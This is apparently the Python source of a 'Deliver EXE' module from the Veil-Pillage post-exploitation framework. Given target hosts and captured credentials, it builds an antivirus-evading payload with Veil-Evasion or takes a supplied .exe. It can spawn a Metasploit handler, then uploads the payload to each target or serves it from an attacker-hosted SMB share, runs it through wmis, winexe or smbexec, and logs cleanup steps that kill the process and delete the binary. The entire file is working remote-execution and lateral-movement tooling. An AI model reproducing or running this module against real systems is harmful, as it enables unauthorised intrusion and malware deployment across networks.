"""

Deliver an .exe to a system and trigger it.

Can either upload/execute or host/unc_execute
Has the ability to drop into Veil-Evasion for .exe contruction.


Module built by @harmj0y

"""

import sys, os

from lib import helpers
from lib import messages
from lib import delivery_methods
import settings

# Veil-Evasion import
from modules.common import controller

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Deliver EXE"
        self.description = "Deliver and trigger an .exe to a host."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"   :   ["wmis", "[wmis], [winexe], or [smbexec] for triggering"],
                                 "transport"        :   ["upload", "[upload] or [host] the exe"],
                                 "lhost"            :   ["none", "local IP for [host] transport"],
                                 "exe_path"         :   ["veil", "[veil] or existing .exe"],
                                 "spawn_handler"    :   ["false", "spawn a meterpreter handler"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        transport = self.required_options["transport"][0]
        exe_path = self.required_options["exe_path"][0]
        lhost = self.required_options["lhost"][0]
        spawnHandler = self.required_options["spawn_handler"][0].lower()

        # quick sanity check for host/execute logic before we continue...
        if transport.lower() == "host":
            # if 'host' is given for a transport method but no lhost is specified
            if lhost == "none" or lhost == "":
                print helpers.color("\n [!] lhost needed when hosting a payload", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""

        # if we're using Veil-Evasion for payload generation
        if exe_path.lower() == "veil":

            # create a Veil-Evasion controller object for payload generation
            con = controller.Controller()

            # check various possibly flags passed by the command line

            # if we don't have payload specified, jump to the main controller menu
            if not self.args.p:
                payloadPath = con.MainMenu()
            # otherwise, set all the appropriate payload options
            else:
                # pull out any required options from the command line and
                # build the proper dictionary so we can set the payload manually
                options = {}
                if self.args.c:
                    options['required_options'] = {}
                    for option in self.args.c:
                        name,value = option.split("=")
                        options['required_options'][name] = [value, ""]

                # pull out any msfvenom shellcode specification and msfvenom options
                if self.args.msfpayload:
                    options['msfvenom'] = [self.args.msfpayload, self.args.msfoptions]

                # manually set the payload in the controller object
                con.SetPayload(self.args.p, options)

                # generate the payload code
                code = con.GeneratePayload()

                # grab the generated payload .exe name
                payloadPath = con.OutputMenu(con.payload, code, showTitle=True, interactive=False)


            # nicely print the title and module name again (since Veil-Evasion trashes this)
            messages.title()
            print " [*] Executing module: " + helpers.color(self.name) + "..."

            # sanity check if the user exited Veil-Evasion execution
            if not payloadPath or payloadPath == "":
                print helpers.color(" [!] No output from Veil-Evasion", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""

        # if we have a custom-specified .exe, use that instead
        else:
            payloadPath = exe_path

            # if the .exe path doesn't exist, print and error and return
            if not os.path.exists(payloadPath):
                print helpers.color("\n\n [!] Invalid .exe path specified", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""

        # if we're using Veil-Evasion's generated handler script, try to spawn it
        if spawnHandler.lower() == "true":
            # build the path to what the handler should be and
            handlerPath = settings.HANDLER_PATH + payloadPath.split(".")[0].split("/")[-1] + "_handler.rc"
            # command to spawn a new tab
            cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
            # invoke msfconsole with the handler script in a new tab
            os.system(cmd)
            raw_input("\n [>] Press enter when handler is ready: ")


        # the hostTrigger method gets the whole target list so the smb hosting
        # server doesn't have to be setup/torn down for each target
        if transport.lower() == "host":
            # if 'host' is given for a transport method but no lhost is specified
            if lhost == "none":
                print helpers.color("\n [!] lhost needed when hosting a payload", warning=True)
                raw_input("\n [>] Press enter to continue: ")
                return ""
            else:
                # execute the host/trigger command with all the targers
                process = delivery_methods.hostTrigger(self.targets, username, password, payloadPath, lhost, triggerMethod)
                # build the command to kill that process
                killCmd = "taskkill /f /im "+process

                for target in self.targets:
                    self.output += "[*] Payload '\\\\"+lhost+"\\SYSTEM\\"+process+"' triggered using creds '"+username+":"+password+"' on : " + target + "\n"
                    # build our cleanup file to kill the process
                    self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCmd+"|"+triggerMethod+"\n"

        # assume upload/trigger
        else:
            for target in self.targets:
                # execute the upload/trigger command with all the targets
                deliveredName = delivery_methods.uploadTrigger(target, username, password, payloadPath, triggerMethod)
                self.output += "[*] Payload '"+deliveredName+"' uploaded and triggered using creds '"+username+":"+password+"' on : " + target + "\n"

                # build the command to kill that process
                killCmd = "taskkill /f /im "+deliveredName

                # build our cleanup file to kill the process and delete the binary
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCmd+"|"+triggerMethod+"\n"
                # sleep for 3 seconds
                self.cleanup += "sleep|1\n"
                # delete the file off
                self.cleanup += "deletefile|"+target+"|"+username+"|"+password+"|C:\\Windows\\Temp\\"+deliveredName+"\n"
